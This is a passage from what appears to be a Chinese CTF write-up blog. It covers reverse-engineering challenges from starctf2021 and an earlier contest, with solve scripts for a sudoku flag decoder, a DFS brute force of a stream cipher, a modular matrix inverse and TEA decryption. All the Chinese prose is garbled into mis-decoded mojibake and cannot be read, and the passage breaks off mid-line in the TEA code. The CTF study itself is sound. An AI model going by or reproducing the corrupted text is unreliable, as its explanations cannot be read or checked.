title="warmup"></a>warmup</h3><p>å°±ä¸€ä¸ªæ•°ç‹¬æ¸¸æˆï¼Œå¼€å§‹åˆ¤æ–­æ˜¯ä¸æ˜¯æ¯åˆ—æ¯è¡Œçš„æ•°éƒ½å„ä¸ç›¸åŒï¼Œç„¶ååˆ¤æ–­æ¯4*4çš„å•å…ƒæ˜¯ä¸æ˜¯æ¯ä¸ªæ•°å„ä¸ç›¸åŒï¼Œå…¸å‹çš„æ•°ç‹¬ç‰¹å¾ã€‚</p><p>ç›´æ¥æ‰¾ä¸ªåœ¨çº¿æ±‚è§£ä¸€ä¸‹å³å¯ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> flag[] = &#123;<span class="number">8</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">13</span>, <span class="number">10</span>, <span class="number">9</span>, <span class="number">15</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">12</span>, <span class="number">9</span>, </span><br><span class="line"><span class="number">14</span>, <span class="number">16</span>, <span class="number">12</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">10</span>, <span class="number">4</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">2</span>,</span><br><span class="line"><span class="number">1</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">14</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">13</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">6</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">48</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(flag[i]<span class="number">-1</span> &gt;= <span class="number">10</span>)</span><br><span class="line"><span class="built_in">putchar</span>(flag[i]<span class="number">-1</span>+<span class="number">87</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">putchar</span>(flag[i]<span class="number">-1</span>+<span class="number">48</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="e"><a href="#e" class="headerlink" title="e"></a>e</h3><p>åº”è¯¥ç±»ä¼¼ä¸»ç¨‹åºè£…è½½ä¸€ä¸ªæ–‡ä»¶ï¼Œç„¶åå…³é”®å‡½æ•°éƒ½åœ¨é‚£ä¸ª.soæ–‡ä»¶ï¼Œæ‰€ä»¥åŠ¨æ€è·Ÿè¸ªå°±å¥½äº†ï¼Œå¾ˆç®€å•ï¼Œæ‰¾åˆ°è¾“å…¥çš„åœ°æ–¹åä¸‹ä¸ªæ–­ç‚¹ï¼Œä¸€ä¼šå°±æ¥åˆ°çš„ä¸€ä¸ªæ¯”è¾ƒå‡½æ•°ï¼Œè™½ç„¶å»äº†ç¬¦å·ï¼Œä½†è¿˜æ˜¯èƒ½çŒœåˆ°å°±æ˜¯ç±»ä¼¼strcmp()å‡½æ•°ï¼Œè¾“å…¥å’Œç›®æ ‡å­—ç¬¦æ¯”è¾ƒã€‚</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>starctf2021</title>
      <link href="/2021/01/17/starctf2021/"/>
      <url>/2021/01/17/starctf2021/</url>
      
        <content type="html"><![CDATA[<p>åšäº†3ä¸ªReï¼Œä»ä¸­æ„Ÿè§‰è‡ªå·±pythonè¿ç”¨èƒ½åŠ›ä¸è¡Œï¼Œå…¶æ¬¡å¯¹å¸¸è§çš„ä¸€äº›ç®—æ³•æ€§è´¨ä¸è¿‡å…³ï¼Œä¹‹å‰æŠŠz3æƒ³æˆä¸‡èƒ½çš„äº†ï¼Œè¿™é‡Œæœ‰ä¸€ä¸ªé¢˜å› ä¸ºz3æ‰¾ä¸åˆ°è§£æˆ‘å°±ä»¥ä¸ºæ— è§£ã€‚ã€‚å½“æ—¶å°±æƒ³ä¸é€šäº†ã€‚æœ€åå‘ç°å¤§å®¶é‚£ä¸ªé¢˜çˆ†ç ´æ¥åšçš„æ¯”è¾ƒå¤šã€‚ã€‚å…¶æ¬¡å°±æ˜¯åœ¨ä¸€ä¸ªæœ‰é™åŸŸæ±‚é€†çŸ©é˜µç„¶åç›¸ä¹˜å°±å¥½äº†ï¼Œä¹Ÿå°±æ˜¯hillåŠ å¯†ã€‚å¤§ä¸€è¿˜å­¦è¿‡çº¿æ€§ä»£æ•°çš„ã€‚ã€‚</p><p>ç„¶åå°±æ˜¯ä¸€ä¸ªé¢˜å†™ä¸€ä¸ªdfsè„šæœ¬èŠ±äº†å¾ˆå¤šæ—¶é—´ï¼Œå¯¹python3çš„è¯»å†™æ–‡ä»¶â€œwbâ€ä¸â€œwâ€æ¨¡å¼æ²¡æœ‰äº†è§£ï¼Œè¿™æ¬¡è¿ç”¨å°±æš´éœ²å‡ºäº†é—®é¢˜ã€‚ã€‚ä¸”è¿™åœ¨python2ä¸python3ä¸­ä¹Ÿæœ‰åŒºåˆ«ã€‚</p><p>æœ€åå¤šçº¿ç¨‹çˆ†ç ´ç¡®å®æ˜¯ä¸ªå¥½ä¸œè¥¿ã€‚æœç´¢ç®—æ³•è¦å¥½å¥½å­¦ã€‚ã€‚</p><p>é˜Ÿä¼29åï¼ŒåŠ æ²¹ã€‚<a id="more"></a></p><h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><h3 id="stream"><a href="#stream" class="headerlink" title="stream"></a>stream</h3><p>å¼€å§‹å…³é”®ç‚¹éƒ½æ²¡æ‰¾åˆ°ï¼Œè¿è¡Œäº†ä¸€ä¸‹ç¨‹åºä»æŠ¥é”™ä¿¡æ¯ç»è¿‡æœç´¢çŸ¥é“äº†è¿™æ˜¯ä¸ªrustå†™ç¨‹åºï¼Œä¸”è¿™ä¸ªé”™è¯¯ä¿¡æ¯æ˜¯ç¼–å†™çš„æ—¶å€™å¯ä»¥å®šä¹‰çš„ï¼Œä»è¿™ä¹Ÿé¡ºè—¤æ‘¸ç“œçš„çŸ¥é“äº†æŠ¥é”™æ˜¯å› ä¸ºæ²¡æœ‰flagæ–‡ä»¶ã€‚</p><p>ç¨‹åºé¦–å…ˆè¯»å–flagæ–‡ä»¶å–æ•°æ®ï¼Œç»è¿‡åŠ å¯†åå†™å…¥outputæ–‡ä»¶ã€‚</p><p><img src="/2021/01/17/starctf2021/image-20210127134521754-1611759746138.png" alt="image-20210127134521754"></p><p>ç„¶åç®€å•åˆ†æä¸€ä¸‹ï¼Œé€»è¾‘ä»€ä¹ˆçš„å¾ˆæ¸…æ¥šï¼ŒæŒ‰ç…§ä¸€å®šçš„é¡ºåºå¯¹æ¯ä¸€ä½è¿›è¡Œå¼‚æˆ–åŠ å¯†ï¼Œä½†æ˜¯é‚£ä¸ªå¼‚æˆ–çš„å€¼æ˜¯éšæœºçš„ï¼Œé€šè¿‡å‰é¢çš„æ•°æ®æ¥åˆå§‹åŒ–çš„æ•°æ®æµã€‚æ˜¯ä¸€ç§æµå¯†ç ï¼Œä½†è¿™é‡Œæƒ³äº†å¾ˆä¹…ä½†æ˜¯ä¸çŸ¥é“æ€ä¹ˆé€†ï¼Œåé¢æƒ³åˆ°æŒ‰ç…§é¢˜ç›®åŠ å¯†çš„é¡ºåºä¸€ä½ä¸€ä½çš„ç©·ä¸¾è‚¯å®šå¯ä»¥ï¼Œï¼Œä½†æ˜¯å·¥ç¨‹é‡å°±æœ‰ç‚¹å¤§äº†ã€‚ã€‚</p><p>æœ€åæ‰æƒ³åˆ°äº†pythonè„šæœ¬ï¼ŒèŠ±äº†ç‚¹æ—¶é—´ï¼Œä¹Ÿæ”¹äº†å¾ˆå¤šï¼Œè¿˜æœ‰å°±æ˜¯è¿™ä¸ªå­˜åœ¨å¤šå¯¹ä¸€çš„æƒ…å†µï¼Œæ‰€ä»¥è¦æœç´¢ã€‚ã€‚</p><p>å…¶æ¬¡å¼€å§‹æ€ä¹ˆä¹Ÿè·‘ä¸å‡ºæ¥ï¼Œåé¢è°ƒè¯•æ‰å‘ç°ï¼Œç¨‹åºæ¯æ¬¡è¯»å–çš„å­—ç¬¦éƒ½åŠ äº†å›è½¦ï¼ˆâ€™\0xaâ€™ï¼‰ï¼Œè¿™å°±å¯¼è‡´é•¿åº¦å¢åŠ ï¼Œè€ŒåŠ å¯†æ˜¯ç”¨åˆ°äº†é•¿åº¦çš„ã€‚ã€‚ç„¶åå°±æ˜¯ä¸ºä»€ä¹ˆå‘¢ï¼Ÿ</p><p>æœ€åå¤§é‡å°è¯•æœç´¢æ‰å‘ç°ï¼Œå› ä¸ºæˆ‘å¼€å§‹æ˜¯å¾€flagæ–‡ä»¶æ‰‹åŠ¨è¾“å…¥çš„ï¼Œç„¶åè„šæœ¬é‡Œä¹Ÿæ˜¯å…ˆè¯»å–flagæ–‡ä»¶ï¼Œè¿™å°±å¯¼è‡´å¼€å§‹å°±å¤šäº†å’Œä¸€ä¸ªâ€™\0xaâ€™ï¼Œè€Œååœ¨å†™å…¥ä¹Ÿæ˜¯åŒæ ·æœ‰â€˜\0xaâ€™ã€‚å…¶æ¬¡python2çš„â€˜rbâ€™ä¸â€˜râ€™æ¨¡å¼è¯»å–éƒ½æ˜¯strç±»å‹ï¼Œè€Œpython3çš„â€˜rbâ€™æ˜¯byte, â€˜râ€™æ‰æ˜¯strç±»å‹ã€‚ä¸”pythonè‹¥æ˜¯â€˜wbâ€™å†™å…¥é‚£å†™å…¥æ•°æ®å¿…é¡»æ˜¯byteç±»å‹ï¼Œè€Œpython2å°±éƒ½å¯ä»¥ã€‚</p><p>è¿™é‡Œæ‰§è¡Œç¨‹åºï¼Œæœ‰3ç§åŠæ³•ï¼š</p><ul><li>os.system(â€˜./aâ€™) è¿™é‡Œå»ºè®®ä½¿ç”¨è¿™ä¸ªã€‚</li><li>ä½¿ç”¨Popen() <a href="https://blog.csdn.net/super_he_pi/article/details/99713374" target="_blank" rel="noopener">python ä¸­subprocess.Popen(ï¼‰è¯¦è§£</a></li><li>pexpect å¦‚æœæœ‰äº¤äº’çš„è¯ï¼Œæ¨èä½¿ç”¨ã€‚</li></ul><p>10så°±å¾—åˆ°äº†ç»“æœï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> pexpect</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">startTime = datetime.datetime.now()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"output_flag"</span>, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">enc = f.read()</span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line">index = [<span class="number">4</span>, <span class="number">11</span>, <span class="number">18</span>, <span class="number">25</span>, <span class="number">32</span>, <span class="number">39</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">14</span>, <span class="number">21</span>, <span class="number">28</span>, <span class="number">35</span>, <span class="number">42</span>, <span class="number">3</span>, <span class="number">10</span>, <span class="number">17</span>, <span class="number">24</span>, <span class="number">31</span>, <span class="number">38</span>, <span class="number">45</span>, <span class="number">6</span>, <span class="number">13</span>, <span class="number">20</span>, <span class="number">27</span>, <span class="number">34</span>, <span class="number">41</span>, <span class="number">2</span>, <span class="number">9</span>, <span class="number">16</span>, <span class="number">23</span>, <span class="number">30</span>, <span class="number">37</span>, <span class="number">44</span>, <span class="number">5</span>, <span class="number">12</span>, <span class="number">19</span>, <span class="number">26</span>, <span class="number">33</span>, <span class="number">40</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">15</span>, <span class="number">22</span>, <span class="number">29</span>, <span class="number">36</span>, <span class="number">43</span>]</span><br><span class="line">base = <span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#123;&#125;_=-~!.@#%^&amp;*()"</span></span><br><span class="line">result = [<span class="string">'1'</span>]*<span class="number">46</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dfs</span><span class="params">(i)</span>:</span></span><br><span class="line"><span class="keyword">if</span> i &gt; <span class="number">45</span>:</span><br><span class="line">print(<span class="string">'find one:'</span> + <span class="string">''</span>.join(result))</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ch <span class="keyword">in</span> base:</span><br><span class="line">result[index[i]] = ch</span><br><span class="line">flag = <span class="string">''</span>.join(result)</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'flag'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">f.write(flag.encode())</span><br><span class="line">f.close()</span><br><span class="line"><span class="comment">#r = pexpect.spawn('./a')</span></span><br><span class="line"><span class="comment">#r.wait()</span></span><br><span class="line">os.system(<span class="string">'./a'</span>)</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'output'</span>, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">ans = f.read()</span><br><span class="line">f.close()</span><br><span class="line"><span class="keyword">if</span> ans[index[i]] == enc[index[i]]:</span><br><span class="line">    print(flag)</span><br><span class="line">    dfs(i+<span class="number">1</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">continue</span></span><br><span class="line">dfs(<span class="number">0</span>)</span><br><span class="line">endTime = datetime.datetime.now()</span><br><span class="line">print(<span class="string">"è¿è¡Œçš„æ—¶é—´æ˜¯ï¼š%ss"</span> % (endTime - startTime).seconds)</span><br></pre></td></tr></table></figure><h3 id="ChineseGame"><a href="#ChineseGame" class="headerlink" title="ChineseGame"></a>ChineseGame</h3><p>è¯»æ‡‚æ¸¸æˆæ€ä¹ˆç©çš„åï¼Œæ‰‹åŠ¨å¼„äº†å‡ ä¸ªæ•°æ®ç„¶åæ€»ç»“è§„å¾‹ã€‚</p><p>ä¸€ä¸ªé•¿åº¦ä¸º10çš„é“¾è¡¨ï¼Œæœ€åæŠŠæ‰€æœ‰çš„æ•°æ®åŸŸéƒ½å˜æˆå¤§äº100ã€‚</p><p><img src="/2021/01/17/starctf2021/image-20210127135918158-1611759760723.png" alt="image-20210127135918158"></p><p>å°±æ˜¯ä¸æ–­ç´¯åŠ å¥—ä¸Šå»å°±æ˜¯äº†ã€‚</p><p>èµ›åçœ‹å¤§å®¶å¾ˆå¤šéƒ½æ˜¯å‘ç°äº†åªè¦é‚£ä¸ªæ•°æ®åŸŸæ˜¯0å°±åƒå‘ä¸Šï¼Œ1çš„è¯å°±å‘ä¸‹ï¼Œç›´æ¥paythonè„šæœ¬ï¼ŒçœŸæ˜¯å¥½ã€‚ã€‚ã€‚</p><h3 id="wherekey"><a href="#wherekey" class="headerlink" title="wherekey"></a>wherekey</h3><p>å°±æ˜¯è¿™ä¸ªé¢˜å› ä¸ºz3æ²¡æœ‰è§£ï¼Œä»¥ä¸ºæˆ‘å“ªé‡Œå¼„é”™äº†éƒé—·åŠå¤©ï¼Œæœ€åä¹Ÿæ²¡æœ‰æŠŠé¢˜ç›®åšå‡ºæ¥ã€‚</p><p>ç”±çŸ©é˜µçš„ä¹˜æ³•å¯çŸ¥ï¼Œè¿™é‡Œç®—æ³•å®é™…å°±æ˜¯ç”¨ä¸€ä¸ªå›ºå®šçš„5*5çŸ©é˜µå»ä¹˜flagç»„æˆçš„5*5çŸ©é˜µï¼Œä½†æ˜¯æ¯æ¬¡éƒ½modäº†257ï¼Œæ‰€ä»¥åœ¨ä¸€ä¸ªæœ‰é™åŸŸå†…ã€‚</p><p>ç„¶åå…¶å®å¯ä»¥çˆ†ç ´çš„ï¼Œæˆ‘çœ‹çˆ†ç ´çš„äººä¹ŸæŒºå¤šçš„ï¼Œhhhaã€‚ã€‚</p><p>è¿™é‡Œæˆ‘ç®—äº†ä¸€ä¸‹ï¼Œå¦‚æœå¸¸è§„å†™5ä¸ªforå¾ªç¯çˆ†ç ´æ—¶é—´ä¸ä¼šå°‘çš„ã€‚ã€‚</p><p>ä½†æ˜¯ç”¨pwntoolsçš„å¤šçº¿ç¨‹çˆ†ç ´ï¼Œæœ€å¤š2ä¸ªå¤šå°æ—¶å°±æå®šäº†ï¼Œä¹Ÿè¿˜æ˜¯å¯ä»¥çš„ã€‚hhhã€‚<a href="https://happi0.gitee.io/happi0/2020/12/03/%E5%AF%86%E7%A0%81%E5%AD%A6%E4%B8%AD%E7%9A%84python/#toc-heading-3" target="_blank" rel="noopener">Cryptoå¸¸ç”¨å·¥å…·</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> pwnlib</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.iters <span class="keyword">import</span> mbruteforce</span><br><span class="line"></span><br><span class="line">base = <span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#123;&#125;_=-~!.@#%^&amp;*()"</span></span><br><span class="line">enc = [<span class="number">56</span>, <span class="number">109</span>,  <span class="number">75</span>,  <span class="number">75</span>, <span class="number">185</span>, <span class="number">138</span>, <span class="number">249</span>, <span class="number">138</span>, <span class="number">187</span>,  <span class="number">92</span>, </span><br><span class="line">  <span class="number">138</span>, <span class="number">154</span>, <span class="number">186</span>, <span class="number">107</span>, <span class="number">210</span>, <span class="number">198</span>, <span class="number">187</span>,   <span class="number">5</span>, <span class="number">144</span>,  <span class="number">86</span>, </span><br><span class="line">  <span class="number">147</span>, <span class="number">230</span>,  <span class="number">18</span>, <span class="number">189</span>,  <span class="number">79</span>]</span><br><span class="line">b = <span class="string">"flag&#123;are_you_sure_friend&#125;"</span></span><br><span class="line">b = list(map(ord, b))</span><br><span class="line">enc = enc[<span class="number">5</span>:]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(a)</span>:</span></span><br><span class="line">a = list(map(ord, a))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line"><span class="comment">#a = list(map(ord, a)) å¾ˆæ— è„‘çš„é”™è¯¯ï¼Œä¸èƒ½æ”¾åœ¨è¿™é‡Œçš„åŸå› :å› ä¸ºå¦‚æœå·²ç»è½¬æ¢äº†ä¸€æ¬¡äº†ï¼Œé‚£å°±å·²ç»æ˜¯intå‹ï¼Œä¸‹ä¸€æ¬¡è½¬æ¢å°±å‡ºé”™äº†ã€‚</span></span><br><span class="line"><span class="keyword">if</span> ((a[<span class="number">0</span>]*b[i] + a[<span class="number">1</span>]*b[<span class="number">5</span>+i] + a[<span class="number">2</span>]*b[<span class="number">10</span>+i] + a[<span class="number">3</span>]*b[<span class="number">15</span>+i] + a[<span class="number">4</span>]*b[<span class="number">20</span>+i])%<span class="number">257</span>) != enc[i]:</span><br><span class="line"><span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">ans = mbruteforce(check, base, <span class="number">5</span>, method=<span class="string">'fixed'</span>)</span><br></pre></td></tr></table></figure><p>æœ€åè´´ä¸€ä¸‹å®˜æ–¹æ”¾çš„ä½¿ç”¨sageæ±‚è§£ï¼Œä¹Ÿå°±æ˜¯å¸¦ä½™çš„çŸ©é˜µä¹˜æ³•å’Œé€†çŸ©é˜µã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">A = Matrix(GF(<span class="number">257</span>),[[<span class="number">102</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">103</span>, <span class="number">123</span>], [<span class="number">97</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">95</span>, <span class="number">121</span>], [<span class="number">111</span>, <span class="number">117</span>, <span class="number">95</span>, <span class="number">115</span>, <span class="number">117</span>], [<span class="number">114</span>, <span class="number">101</span>, <span class="number">95</span>, <span class="number">102</span>, <span class="number">114</span>], [<span class="number">105</span>, <span class="number">101</span>, <span class="number">110</span>, <span class="number">100</span>, <span class="number">125</span>]])</span><br><span class="line"></span><br><span class="line">encode =  Matrix(GF(<span class="number">257</span>),[[<span class="number">56</span>, <span class="number">109</span>, <span class="number">75</span>,<span class="number">75</span>,<span class="number">185</span>], [<span class="number">138</span> ,<span class="number">249</span>, <span class="number">138</span>, <span class="number">187</span>,  <span class="number">92</span>],[<span class="number">138</span>, <span class="number">154</span> ,<span class="number">186</span>, <span class="number">107</span>, <span class="number">210</span>],[<span class="number">198</span>, <span class="number">187</span>,   <span class="number">5</span>, <span class="number">144</span>,  <span class="number">86</span>],[<span class="number">147</span>, <span class="number">230</span>,  <span class="number">18</span>, <span class="number">189</span>,  <span class="number">79</span>]])</span><br><span class="line"></span><br><span class="line">flag = encode*A.inverse()</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ‰¾ä¸ªåœ¨çº¿ç½‘ç«™è§£ä¸€ä¸‹å°±å¥½ï¼š<a href="https://sagecell.sagemath.org/" target="_blank" rel="noopener">sageåœ¨çº¿æ±‚è§£</a></p><p><img src="/2021/01/17/starctf2021/image-20210127153009965-1611759765185.png" alt="image-20210127153009965"></p><h3 id="Favourite-Architecture-flag0"><a href="#Favourite-Architecture-flag0" class="headerlink" title="Favourite Architecture flag0"></a>Favourite Architecture flag0</h3><p>æœ‰ghidra9.2å°±å¾ˆç®€å•äº†ï¼ŒæŸ¥æŸ¥riscvç›¸å…³çš„æŒ‡ä»¤ï¼Œå®åœ¨ä¸å¥½ç†è§£çš„æ–¹å¼è°ƒè¯•ä¹Ÿè¡Œã€‚</p><p>å‰åŠæ®µæµåŠ å¯†ï¼Œåªè¦æœ€åå¾—åˆ°æœ€åçš„å¼‚æˆ–å€¼å°±å¥½äº†ã€‚ååŠæ®µä¸€ä¸ªteaåŠ å¯†ã€‚</p><p>è¿™é‡Œè´´ä¸‹teaå§ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> key[] = &#123;<span class="number">0xbb</span>, <span class="number">0xa0</span>, <span class="number">0x68</span>, <span class="number">0x13</span>, <span class="number">0x1e</span>, <span class="number">0xce</span>, <span class="number">0x0a</span>, <span class="number">0x19</span></span><br><span class="line">, <span class="number">0x57</span>, <span class="number">0xa3</span>, <span class="number">0xd8</span>, <span class="number">0x35</span>, <span class="number">0x61</span>, <span class="number">0x2c</span>, <span class="number">0xbf</span>, <span class="number">0x26</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> enc[] = &#123;<span class="number">0xf9</span>, <span class="number">0x87</span>, <span class="number">0x50</span>, <span class="number">0xc4</span>, <span class="number">0xb2</span>, <span class="number">0xf2</span>, <span class="number">0x03</span>, <span class="number">0x07</span></span><br><span class="line">, <span class="number">0x3c</span>, <span class="number">0xf4</span>, <span class="number">0x74</span>, <span class="number">0x69</span>, <span class="number">0x59</span>, <span class="number">0xbb</span>, <span class="number">0xb4</span>, <span class="number">0xed</span></span><br><span class="line">, <span class="number">0x2a</span>, <span class="number">0xb0</span>, <span class="number">0xf0</span>, <span class="number">0x0f</span>, <span class="number">0xf2</span>, <span class="number">0x20</span>, <span class="number">0x85</span>, <span class="number">0x00</span></span><br><span class="line">, <span class="number">0xdd</span>, <span class="number">0x23</span>, <span class="number">0xcd</span>, <span class="number">0xfd</span>, <span class="number">0x75</span>, <span class="number">0x48</span>, <span class="number">0x02</span>, <span class="number">0x35</span></span><br><span class="line">, <span class="number">0xd3</span>, <span class="number">0xb6</span>, <span class="number">0xd7</span>, <span class="number">0xf1</span>, <span class="number">0xe1</span>, <span class="number">0x1b</span>, <span class="number">0xf2</span>, <span class="number">0x74</span></span><br><span class="line">, <span class="number">0x12</span>, <span class="number">0xbf</span>, <span class="number">0x2d</span>, <span class="number">0xcb</span>, <span class="number">0xf6</span>, <span class="number">0x53</span>, <span class="number">0xb4</span>, <span class="number">0xa4</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//(*((unsigned int *)(enc+8*i)) &gt;&gt; 5)+*((unsigned int *)key+3)^delat+*((unsigned int *)(enc+8*i))*(*((unsigned int *)(enc+8*i)))^0x10+*((unsigned int *)key+2)</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> delat = <span class="number">3816266640</span>;</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">16</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line">*(((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(enc+<span class="number">8</span>*i))+<span class="number">1</span>) -= (*((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(enc+<span class="number">8</span>*i)) &gt;&gt; <span class="number">5</span>) + *(((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)key)+<span class="number">3</span>)^delat+ *(((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(enc+<span class="number">8</span>*i)))^(*((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(enc+<span class="number">8</span>*i)))*<span class="number">0x10</span> + *(((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)key)+<span class="number">2</span>);</span><br><span class="line">*(((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(enc+<span class="number">8</span>*i))) -= (*(((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(enc+<span class="number">8</span>*i)+<span class="number">1</span>)) &gt;&gt; <span class="number">5</span>) + *(((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)key)+<span class="number">1</span>)^delat+ *(((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(enc+<span class="number">8</span>*i))+<span class="number">1</span>)^(*(((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(enc+<span 